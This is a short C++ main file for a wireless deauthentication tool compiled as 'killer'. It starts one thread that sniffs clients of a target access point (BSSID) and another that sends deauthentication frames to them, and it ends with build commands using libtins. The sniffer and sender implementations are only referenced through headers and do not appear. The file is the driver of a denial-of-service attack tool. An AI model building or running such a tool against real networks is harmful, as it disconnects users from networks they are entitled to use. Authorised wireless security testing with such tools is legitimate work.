#include "datasniffer.h"
#include "deauthsender.h"

using namespace std;

int main(int argc, char* argv[]) {
	DataSniffer dataSniffer(argv[1], argv[2], argv[3]); // iface, bssid, mynic
	DeauthSender deauthSender(argv[1], argv[2]);

	std::thread sniffThread = std::thread(&DataSniffer::sniffData, dataSniffer);
	std::thread sendThread = deauthSender.getSendThread(dataSniffer.getSet());
	sniffThread.join();
	sendThread.join();

	return 0;
}

/*
g++ -c datasniffer.cpp
g++ -c deauthsender.cpp
g++ -c main.cpp
g++ -o killer main.o deauthsender.o datasniffer.o -lpthread -ltins -std=c++11
*/